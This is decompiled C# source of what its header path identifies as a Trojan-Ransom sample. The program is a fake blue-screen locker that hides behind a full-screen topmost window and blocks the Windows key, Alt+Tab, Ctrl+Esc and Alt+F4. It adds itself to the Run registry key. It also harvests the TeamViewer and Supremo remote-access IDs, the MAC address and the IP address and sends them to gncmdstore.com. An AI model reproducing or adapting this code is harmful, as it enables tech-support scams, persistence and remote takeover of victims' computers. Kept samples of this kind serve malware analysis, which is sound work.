// Decompiled with JetBrains decompiler
// Type: oneclicklatest.Form1
// Assembly: oneclicklatest, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CBD8E217-FC47-416C-BFD3-69A27E629DDD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-7025d7faf962b8dc45aa3b519eff6a6712c553b320df073ca44e0d78670c17a6.exe

using Microsoft.Win32;
using oneclicklatest.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace oneclicklatest
{
  public class Form1 : Form
  {
    private string sMacAddress = string.Empty;
    private string country = "JP";
    private string Teamviewerstring = string.Empty;
    private string supremostring = string.Empty;
    private IntPtr ptrHook;
    private Form1.LowLevelKeyboardProc objKeyboardProcess;
    private IContainer components = (IContainer) null;
    private Label label1;
    private Label label2;
    private Label label3;
    private Label label4;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int id,
      Form1.LowLevelKeyboardProc callback,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hook);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hook,
      int nCode,
      IntPtr wp,
      IntPtr lp);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern short GetAsyncKeyState(Keys key);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    internal static extern int GetTickCount();

    public Form1()
    {
      this.InitializeComponent();
      this.Bounds = Screen.PrimaryScreen.Bounds;
      Form1.TID();
      this.Tid();
      this.supremon();
      Form1.supremo();
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (this.sMacAddress == string.Empty)
        {
          networkInterface.GetIPProperties();
          this.sMacAddress = networkInterface.GetPhysicalAddress().ToString();
        }
      }
      ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
      this.objKeyboardProcess = new Form1.LowLevelKeyboardProc(this.captureKey);
      this.ptrHook = Form1.SetWindowsHookEx(13, this.objKeyboardProcess, Form1.GetModuleHandle(mainModule.ModuleName), 0U);
    }

    private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
    {
      if (nCode >= 0)
      {
        Form1.KBDLLHOOKSTRUCT structure = (Form1.KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lp, typeof (Form1.KBDLLHOOKSTRUCT));
        if (structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.Tab && this.HasAltModifier(structure.flags) || structure.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control)
          return (IntPtr) 1;
      }
      return Form1.CallNextHookEx(this.ptrHook, nCode, wp, lp);
    }

    private IntPtr workingkey(int nCode, IntPtr wp, IntPtr lp)
    {
      if (nCode >= 0)
      {
        Form1.KBDLLHOOKSTRUCT structure = (Form1.KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lp, typeof (Form1.KBDLLHOOKSTRUCT));
        if (structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.Tab && this.HasAltModifier(structure.flags) || structure.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control)
          return (IntPtr) 0;
      }
      return Form1.CallNextHookEx(this.ptrHook, nCode, wp, lp);
    }

    private bool HasAltModifier(int flags) => (flags & 32) == 32;

    private long supremon()
    {
      try
      {
        string name1 = Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\Supremo" : "SOFTWARE\\Supremo";
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name1);
        if (registryKey == null)
          return 0;
        object obj1 = registryKey.GetValue("ClientID");
        this.supremostring = obj1.ToString();
        if (obj1 != null)
          return Convert.ToInt64(obj1);
        foreach (string name2 in ((IEnumerable<string>) registryKey.GetSubKeyNames()).Reverse<string>())
        {
          object obj2 = registryKey.OpenSubKey(name2).GetValue("ClientID");
          if (obj2 != null)
            return Convert.ToInt64(obj2);
        }
        return 0;
      }
      catch (Exception ex)
      {
        return 0;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("SingleClick", (object) Application.ExecutablePath.ToString());
      this.label1.Text = this.Teamviewerstring.Substring(this.Teamviewerstring.Length - 5);
      this.label3.Text = this.sMacAddress.Substring(this.sMacAddress.Length - 10);
      IPAddress[] addressList = Dns.GetHostEntry(string.Empty).AddressList;
      string empty = string.Empty;
      for (int index = 0; index < addressList.Length; ++index)
        empty = addressList[index].ToString();
      WebBrowser webBrowser = new WebBrowser();
      string currentDirectory = Directory.GetCurrentDirectory();
      webBrowser.Url = new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + this.sMacAddress + "& ip=" + empty + "& TeamViewer_id=" + this.Teamviewerstring + "& country=" + this.country + "& supremoid=" + this.supremostring, (object) currentDirectory));
      webBrowser.ScriptErrorsSuppressed = true;
    }

    public static string supremo()
    {
      List<string> list = ((IEnumerable<string>) new string[8]
      {
        "4",
        "5",
        "5.1",
        "6",
        "7",
        "8",
        "14",
        "15.14.5"
      }).Reverse<string>().ToList<string>();
      string[] strArray = new string[2]
      {
        "SOFTWARE\\Supremo",
        "SOFTWARE\\Wow6432Node\\Supremo"
      };
      foreach (string name1 in strArray)
      {
        if (Registry.LocalMachine.OpenSubKey(name1) != null)
        {
          foreach (string str in list)
          {
            string name2 = string.Format("{0}\\Version{1}", (object) name1, (object) str);
            if (Registry.LocalMachine.OpenSubKey(name2) != null)
            {
              object obj = Registry.LocalMachine.OpenSubKey(name2).GetValue("ClientID");
              if (obj != null)
                return Convert.ToInt32(obj).ToString();
            }
          }
        }
      }
      return string.Empty;
    }

    private long Tid()
    {
      try
      {
        string name1 = Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer";
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name1);
        if (registryKey == null)
          return 0;
        object obj1 = registryKey.GetValue("ClientID");
        this.Teamviewerstring = obj1.ToString();
        if (obj1 != null)
          return Convert.ToInt64(obj1);
        foreach (string name2 in ((IEnumerable<string>) registryKey.GetSubKeyNames()).Reverse<string>())
        {
          object obj2 = registryKey.OpenSubKey(name2).GetValue("ClientID");
          if (obj2 != null)
            return Convert.ToInt64(obj2);
        }
        return 0;
      }
      catch (Exception ex)
      {
        return 0;
      }
    }

    public static string TID()
    {
      List<string> list = ((IEnumerable<string>) new string[8]
      {
        "4",
        "5",
        "5.1",
        "6",
        "7",
        "8",
        "14",
        "15.14.5"
      }).Reverse<string>().ToList<string>();
      string[] strArray = new string[2]
      {
        "SOFTWARE\\TeamViewer",
        "SOFTWARE\\Wow6432Node\\TeamViewer"
      };
      foreach (string name1 in strArray)
      {
        if (Registry.LocalMachine.OpenSubKey(name1) != null)
        {
          foreach (string str in list)
          {
            string name2 = string.Format("{0}\\Version{1}", (object) name1, (object) str);
            if (Registry.LocalMachine.OpenSubKey(name2) != null)
            {
              object obj = Registry.LocalMachine.OpenSubKey(name2).GetValue("ClientID");
              if (obj != null)
                return Convert.ToInt32(obj).ToString();
            }
          }
        }
      }
      return string.Empty;
    }

    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
    {
      if (keyData == (Keys.F4 | Keys.Alt))
        return true;
      if (keyData != (Keys.E | Keys.Control | Keys.Alt))
        return base.ProcessCmdKey(ref msg, keyData);
      this.Close();
      return false;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.label4 = new Label();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.BackColor = SystemColors.ActiveCaptionText;
      this.label1.ForeColor = SystemColors.ControlLightLight;
      this.label1.Location = new Point(406, 41);
      this.label1.Name = "label1";
      this.label1.Size = new Size(35, 13);
      this.label1.TabIndex = 0;
      this.label1.Text = "label1";
      this.label2.AutoSize = true;
      this.label2.BackColor = SystemColors.ActiveCaptionText;
      this.label2.ForeColor = SystemColors.ControlLightLight;
      this.label2.Location = new Point(463, 41);
      this.label2.Name = "label2";
      this.label2.Size = new Size(30, 13);
      this.label2.TabIndex = 1;
      this.label2.Text = "MAC";
      this.label3.AutoSize = true;
      this.label3.BackColor = SystemColors.ActiveCaptionText;
      this.label3.ForeColor = SystemColors.ControlLightLight;
      this.label3.Location = new Point(504, 41);
      this.label3.Name = "label3";
      this.label3.Size = new Size(35, 13);
      this.label3.TabIndex = 2;
      this.label3.Text = "label3";
      this.label4.AutoSize = true;
      this.label4.BackColor = SystemColors.ActiveCaptionText;
      this.label4.ForeColor = SystemColors.ControlLightLight;
      this.label4.Location = new Point(365, 41);
      this.label4.Name = "label4";
      this.label4.Size = new Size(25, 13);
      this.label4.TabIndex = 3;
      this.label4.Text = "TID";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) Resources.bsod_errornew;
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(800, 450);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.DoubleBuffered = true;
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.TopMost = true;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private struct KBDLLHOOKSTRUCT
    {
      public Keys key;
      public int scanCode;
      public int flags;
      public int time;
      public IntPtr extra;
      public int vkCode;
      public int dwExtraInfo;
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
